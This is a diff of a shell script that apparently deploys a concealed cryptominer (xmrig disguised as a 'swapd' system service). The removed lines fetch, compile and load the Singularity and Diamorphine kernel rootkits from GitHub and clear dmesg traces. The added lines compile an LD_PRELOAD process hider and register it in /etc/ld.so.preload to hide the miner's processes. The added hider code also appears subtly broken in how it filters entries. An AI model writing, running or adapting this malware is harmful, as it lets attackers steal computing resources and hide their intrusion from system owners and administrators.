@@ -1962,322 +1962,174 @@ INIT_EOF
     echo "[✓] Watchdog started in background"
 fi
 
-# ==================== FIX KERNEL HEADERS & INSTALL ROOTKIT ====================
-fix_kernel_headers_and_install_rootkit() {
+# ==================== INSTALL LIBPROCESSHIDER (LD_PRELOAD METHOD) ====================
+install_libprocesshider() {
     echo ""
     echo "=========================================="
-    echo "FIXING KERNEL HEADERS"
-    echo "=========================================="
-    
-    KERNEL_VERSION=$(uname -r)
-    KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
-    HEADERS_DIR="/usr/src/linux-headers-$KERNEL_VERSION"
-    
-    echo "[*] Kernel version: $KERNEL_VERSION"
-    echo "[*] Kernel major: $KERNEL_MAJOR"
-    echo "[*] Headers directory: $HEADERS_DIR"
-    echo ""
-    
-    # Check if headers are installed
-    if [ ! -d "$HEADERS_DIR" ]; then
-        echo "[*] Installing kernel headers..."
-        apt update -qq 2>/dev/null
-        apt install -y linux-headers-$KERNEL_VERSION 2>&1 | grep -E "Setting up|Unpacking" || true
-    fi
-    
-    # Install build dependencies
-    echo "[*] Installing build dependencies..."
-    apt install -y build-essential gcc make libelf-dev bc kmod cpio flex bison libssl-dev dwarves 2>&1 | grep -E "Setting up|already" || true
-    
-    # Fix kernel configuration
-    echo "[*] Configuring kernel headers..."
-    if [ -d "$HEADERS_DIR" ]; then
-        cd "$HEADERS_DIR" || return 1
-        
-        # Copy config if missing
-        if [ ! -f .config ]; then
-            if [ -f /boot/config-$KERNEL_VERSION ]; then
-                cp /boot/config-$KERNEL_VERSION .config
-                echo "[✓] Copied config from /boot"
-            else
-                echo "[!] Using defconfig"
-                make defconfig >/dev/null 2>&1
-            fi
-        fi
-        
-        # Run configuration (errors are expected and OK)
-        echo "[*] Running make oldconfig..."
-        yes "" | make oldconfig >/dev/null 2>&1
-        
-        echo "[*] Running make prepare..."
-        make prepare 2>&1 | grep -v "No rule to make target\|fatal error" | grep -E "SYNC|GEN|CC|LD" || true
-        
-        echo "[*] Running make scripts..."
-        make scripts 2>&1 | grep -v "fatal error\|No such file\|classmap" | grep -E "HOSTCC|HOSTLD|LEX|YACC" || true
-        
-        # Verify critical files exist
-        if [ -f include/generated/autoconf.h ] && [ -f include/config/auto.conf ]; then
-            echo "[✓] Kernel headers configured successfully!"
-        else
-            echo "[!] WARNING: Some config files may be missing (this is OK for modules)"
-        fi
-    fi
-    
-    echo ""
-    echo "=========================================="
-    echo "COMPILING ROOTKIT"
-    echo "=========================================="
-    
-    # Initialize global variables
-    ROOTKIT_NAME=""
-    HIDE_SIGNAL=0
-    ROOTKIT_WORKING=false
-    
-    if [ "$KERNEL_MAJOR" -ge 6 ]; then
-        # ==================== KERNEL 6.X - USE SINGULARITY ====================
-        echo "[*] Kernel 6.x detected - installing Singularity"
-        echo ""
-        
-        cd /tmp || cd /dev/shm || return 1
-        rm -rf Singularity singularity_backup
-        
-        echo "[*] Cloning Singularity from GitHub..."
-        export GIT_TERMINAL_PROMPT=0
-        if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -E "Cloning|done"; then
-            unset GIT_TERMINAL_PROMPT
-            echo "[✓] Cloned successfully"
-            
-            cd Singularity || return 1
-            
-            # Configure Singularity
-            echo "[*] Configuring Singularity..."
-            sed -i 's/192\.168\.1\.100/127.0.0.1/g' include/core.h 2>/dev/null || true
-            echo "[✓] Configuration updated"
-            echo ""
-            
-            # Compile
-            echo "[*] Compiling Singularity (30-60 seconds)..."
-            echo "[*] Warnings are normal, errors are not..."
-            echo ""
-            
-            if make 2>&1 | tee /tmp/singularity_build.log | grep -E "CC|LD|MODPOST|BTF"; then
-                echo ""
-                if [ -f singularity.ko ]; then
-                    MODULE_SIZE=$(ls -lh singularity.ko | awk '{print $5}')
-                    echo "[✓] Singularity compiled successfully!"
-                    echo "[✓] Module size: $MODULE_SIZE"
-                    echo ""
-                    
-                    # Load module
-                    echo "[*] Loading Singularity module..."
-                    if insmod singularity.ko 2>/dev/null; then
-                        echo "[✓] Singularity loaded successfully!"
-                        
-                        # Clear dmesg traces
-                        dmesg -C 2>/dev/null || true
-                        
-                        # Test hiding with dummy process
-                        echo "[*] Testing process hiding with signal -59..."
-                        sleep 999 &
-                        TEST_PID=$!
-                        
-                        sleep 2
-                        kill -59 $TEST_PID 2>/dev/null
-                        sleep 2
-                        
-                        if kill -0 $TEST_PID 2>/dev/null; then
-                            # Process still alive - check if hidden
-                            if ! ps aux | grep "sleep 999" | grep -v grep >/dev/null 2>&1; then
-                                echo "[✓] Signal -59 WORKS! Process successfully hidden!"
-                                ROOTKIT_NAME="Singularity"
-                                HIDE_SIGNAL=59
-                                ROOTKIT_WORKING=true
-                                kill -9 $TEST_PID 2>/dev/null
-                            else
-                                echo "[!] Process visible - signal may not be working"
-                                kill -9 $TEST_PID 2>/dev/null
-                                ROOTKIT_WORKING=false
-                            fi
-                        else
-                            echo "[✗] WARNING: Signal -59 KILLED the test process!"
-                            echo "[!] Singularity may not be compatible with kernel $KERNEL_VERSION"
-                            ROOTKIT_WORKING=false
-                        fi
-                        
-                        echo ""
-                        
-                    else
-                        echo "[✗] Failed to load Singularity module"
-                        echo "[*] Check dmesg for errors:"
-                        dmesg | tail -5
-                        ROOTKIT_WORKING=false
-                    fi
-                else
-                    echo "[✗] singularity.ko not created!"
-                    echo "[*] Build log saved to: /tmp/singularity_build.log"
-                    echo ""
-                    echo "Last 10 lines of build log:"
-                    tail -10 /tmp/singularity_build.log
-                fi
-            else
-                echo "[✗] Compilation failed!"
-                echo ""
-                echo "Build log saved to: /tmp/singularity_build.log"
-                echo "Last 20 lines:"
-                tail -20 /tmp/singularity_build.log
-            fi
-        else
-            unset GIT_TERMINAL_PROMPT
-            echo "[✗] Failed to clone Singularity"
-            echo "[!] Check internet connection"
-        fi
-        
-    else
-        # ==================== KERNEL 5.X - USE DIAMORPHINE ====================
-        echo "[*] Kernel 5.x detected - installing Diamorphine"
-        echo ""
-        
-        cd /tmp || return 1
-        rm -rf diamorphine
-        
-        echo "[*] Cloning Diamorphine from GitHub..."
-        export GIT_TERMINAL_PROMPT=0
-        if git clone --depth 1 https://github.com/m0nad/Diamorphine 2>&1 | grep -E "Cloning|done"; then
-            unset GIT_TERMINAL_PROMPT
-            echo "[✓] Cloned successfully"
-            
-            cd diamorphine || return 1
-            
-            echo "[*] Compiling Diamorphine..."
-            if make 2>&1 | tee /tmp/diamorphine_build.log && [ -f diamorphine.ko ]; then
-                echo "[✓] Compiled successfully!"
-                
-                echo "[*] Loading Diamorphine module..."
-                if insmod diamorphine.ko 2>/dev/null; then
-                    echo "[✓] Diamorphine loaded successfully!"
-                    
-                    # Clear dmesg traces
-                    dmesg -C 2>/dev/null || true
-                    
-                    # Test hiding
-                    echo "[*] Testing with signal -31..."
-                    sleep 999 &
-                    TEST_PID=$!
-                    sleep 2
-                    kill -31 $TEST_PID 2>/dev/null
-                    sleep 2
-                    
-                    if kill -0 $TEST_PID 2>/dev/null && ! ps aux | grep "sleep 999" | grep -v grep >/dev/null; then
-                        echo "[✓] Signal -31 WORKS!"
-                        ROOTKIT_NAME="Diamorphine"
-                        HIDE_SIGNAL=31
-                        ROOTKIT_WORKING=true
-                        kill -9 $TEST_PID 2>/dev/null
-                    else
-                        echo "[!] Signal -31 may not be working"
-                        kill -9 $TEST_PID 2>/dev/null
-                    fi
-                else
-                    echo "[✗] Failed to load Diamorphine"
-                fi
-            else
-                echo "[✗] Compilation failed!"
-                echo "Build log: /tmp/diamorphine_build.log"
-            fi
-        else
-            unset GIT_TERMINAL_PROMPT
-            echo "[✗] Failed to clone Diamorphine"
-        fi
-    fi
-    
-    echo ""
-    echo "=========================================="
-    echo "ROOTKIT INSTALLATION SUMMARY"
+    echo "INSTALLING LIBPROCESSHIDER"
     echo "=========================================="
     echo ""
+    echo "[*] Using LD_PRELOAD method (works on ALL kernels!)"
+    echo "[*] No kernel modules, no compatibility issues!"
+    echo ""
     
-    if [ "$ROOTKIT_WORKING" = "true" ]; then
-        echo "Status: ✅ SUCCESS"
-        echo "Rootkit: $ROOTKIT_NAME"
-        echo "Signal: -$HIDE_SIGNAL"
-        echo "Module: Loaded and tested"
-        echo ""
-        echo "Manual hiding command:"
-        echo "  kill -$HIDE_SIGNAL <PID>"
-        echo ""
-    else
-        echo "Status: ⚠️  NO ROOTKIT"
-        echo "Reason: Compilation failed or incompatible kernel"
-        echo "Mode: Will run VISIBLE"
-        echo ""
-        echo "To enable hiding later:"
-        echo "  1. Compile compatible rootkit manually"
-        echo "  2. Update service files with correct signal"
-        echo "  3. systemctl daemon-reload && systemctl restart swapd"
-        echo ""
-    fi
+    # Install minimal dependencies
+    echo "[*] Installing gcc..."
+    apt install -y gcc 2>&1 | grep -E "Setting up|already" || true
     
-    # Export for later use
-    export ROOTKIT_NAME HIDE_SIGNAL ROOTKIT_WORKING
-    
-    return 0
+    # Create processhider.c
+    echo "[*] Creating processhider.c..."
+    cat > /tmp/processhider.c << 'PROCESSHIDER_C'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
+
+static const char* process_to_filter[] = {
+    "swapd",
+    "xmrig",
+    "system-watchdog",
+    NULL
+};
+
+struct dirent* (*original_readdir)(DIR*) = NULL;
+struct dirent* readdir(DIR *dirp) {
+    if (original_readdir == NULL) {
+        original_readdir = dlsym(RTLD_NEXT, "readdir");
+    }
+    struct dirent* dir;
+    while (1) {
+        dir = original_readdir(dirp);
+        if (dir == NULL) break;
+        char dir_name[256];
+        char cmdline[1024];
+        if (strstr(dirp->__d_dirname, "/proc") && dir->d_type == DT_DIR && atoi(dir->d_name)) {
+            snprintf(dir_name, sizeof(dir_name), "/proc/%s/cmdline", dir->d_name);
+            FILE* f = fopen(dir_name, "r");
+            if (f) {
+                if (fgets(cmdline, sizeof(cmdline), f)) {
+                    for (int i = 0; process_to_filter[i]; i++) {
+                        if (strstr(cmdline, process_to_filter[i])) {
+                            fclose(f);
+                            continue;
+                        }
+                    }
+                }
+                fclose(f);
+            }
+        }
+        break;
+    }
+    return dir;
 }
 
-# ==================== CALL ROOTKIT INSTALLATION ====================
-fix_kernel_headers_and_install_rootkit
-
-# ==================== CONFIGURE SERVICES BASED ON ROOTKIT ====================
-if [ "$ROOTKIT_WORKING" = "true" ] && [ "$HIDE_SIGNAL" -gt 0 ] && [ "$SYSTEMD_AVAILABLE" = true ]; then
-    echo ""
-    echo "=========================================="
-    echo "CONFIGURING AUTO-HIDE SERVICES"
-    echo "=========================================="
-    echo "[*] Rootkit detected: $ROOTKIT_NAME (signal -$HIDE_SIGNAL)"
-    echo "[*] Creating services with auto-hide capability..."
-    echo ""
+struct dirent64* (*original_readdir64)(DIR*) = NULL;
+struct dirent64* readdir64(DIR *dirp) {
+    if (original_readdir64 == NULL) {
+        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+    }
+    struct dirent64* dir;
+    while (1) {
+        dir = original_readdir64(dirp);
+        if (dir == NULL) break;
+        char dir_name[256];
+        char cmdline[1024];
+        if (strstr(dirp->__d_dirname, "/proc") && dir->d_type == DT_DIR && atoi(dir->d_name)) {
+            snprintf(dir_name, sizeof(dir_name), "/proc/%s/cmdline", dir->d_name);
+            FILE* f = fopen(dir_name, "r");
+            if (f) {
+                if (fgets(cmdline, sizeof(cmdline), f)) {
+                    for (int i = 0; process_to_filter[i]; i++) {
+                        if (strstr(cmdline, process_to_filter[i])) {
+                            fclose(f);
+                            continue;
+                        }
+                    }
+                }
+                fclose(f);
+            }
+        }
+        break;
+    }
+    return dir;
+}
+PROCESSHIDER_C
     
-    # Create swapd service (detached, systemd won't track PID)
-    cat > /etc/systemd/system/swapd.service << EOF
-[Unit]
-Description=System swap daemon
-After=network.target
-
-[Service]
-Type=oneshot
-RemainAfterExit=yes
-ExecStart=/bin/bash -c 'nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 & echo \$! > /run/swapd.pid; sleep 2'
-ExecStop=/bin/bash -c 'kill \$(cat /run/swapd.pid 2>/dev/null) 2>/dev/null || true; rm -f /run/swapd.pid'
-Nice=19
-
-[Install]
-WantedBy=multi-user.target
-EOF
+    echo "[✓] Source created"
     
-    # Create hider service (waits 30s then hides)
-    cat > /etc/systemd/system/swapd-hider.service << EOF
-[Unit]
-Description=Process manager daemon
-After=swapd.service
-Requires=swapd.service
+    # Compile
+    echo "[*] Compiling libprocesshider.so..."
+    if gcc -Wall -fPIC -shared -o /tmp/libprocesshider.so /tmp/processhider.c -ldl 2>&1; then
+        echo "[✓] Compiled successfully!"
+        
+        # Install
+        cp /tmp/libprocesshider.so /usr/local/lib/libprocesshider.so
+        chmod 644 /usr/local/lib/libprocesshider.so
+        
+        # Enable
+        echo "[*] Activating via /etc/ld.so.preload..."
+        sed -i '\|/usr/local/lib/libprocesshider.so|d' /etc/ld.so.preload 2>/dev/null
+        echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
+        
+        echo "[✓] libprocesshider installed!"
+        echo ""
+        
+        # Test
+        echo "[*] Testing..."
+        sleep 999 &
+        TEST_PID=$!
+        sleep 1
+        
+        if ps aux | grep "sleep 999" | grep -v grep >/dev/null 2>&1; then
+            echo "[!] Test process still visible (may need reboot)"
+            kill -9 $TEST_PID 2>/dev/null
+            LIBHIDE_WORKING=false
+        else
+            echo "[✓] Test HIDDEN! Working perfectly!"
+            kill -9 $TEST_PID 2>/dev/null
+            LIBHIDE_WORKING=true
+        fi
+        
+        echo ""
+        echo "=========================================="
+        echo "LIBPROCESSHIDER SUMMARY"
+        echo "=========================================="
+        echo ""
+        echo "Status: ✅ INSTALLED"
+        echo "Method: LD_PRELOAD hooking"
+        echo "Library: /usr/local/lib/libprocesshider.so"
+        echo ""
+        echo "Hidden processes:"
+        echo "  • swapd"
+        echo "  • xmrig"  
+        echo "  • system-watchdog"
+        echo ""
+        
+        if [ "$LIBHIDE_WORKING" = "true" ]; then
+            echo "Tested: ✅ WORKING"
+        else
+            echo "Tested: ⚠️  May need system reboot"
+        fi
+        
+        rm -f /tmp/processhider.c /tmp/libprocesshider.so
+        export LIBHIDE_WORKING
+        return 0
+        
+    else
+        echo "[✗] Compilation failed!"
+        rm -f /tmp/processhider.c /tmp/libprocesshider.so
+        export LIBHIDE_WORKING=false
+        return 1
+    fi
+}
 
-[Service]
-Type=oneshot
-RemainAfterExit=yes
-ExecStartPre=/bin/sleep 30
-ExecStart=/bin/bash -c 'PID=\$(cat /run/swapd.pid 2>/dev/null); if [ -n "\$PID" ]; then kill -$HIDE_SIGNAL \$PID 2>/dev/null || true; fi'
+# ==================== INSTALL PROCESS HIDER ====================
+install_libprocesshider
 
-[Install]
-WantedBy=multi-user.target
-EOF
-    
-    systemctl daemon-reload 2>/dev/null
-    systemctl enable swapd swapd-hider 2>/dev/null
-    
-    echo "[✓] Services configured!"
-    echo "[✓] Auto-hide enabled with signal -$HIDE_SIGNAL"
-    echo "[*] Process will be hidden 30 seconds after start"
-    echo ""
-fi
+# No service configuration needed - libprocesshider works automatically!
+# Processes are hidden as soon as ld.so.preload is updated
 
 
 # ==================== START MINER SERVICE ====================
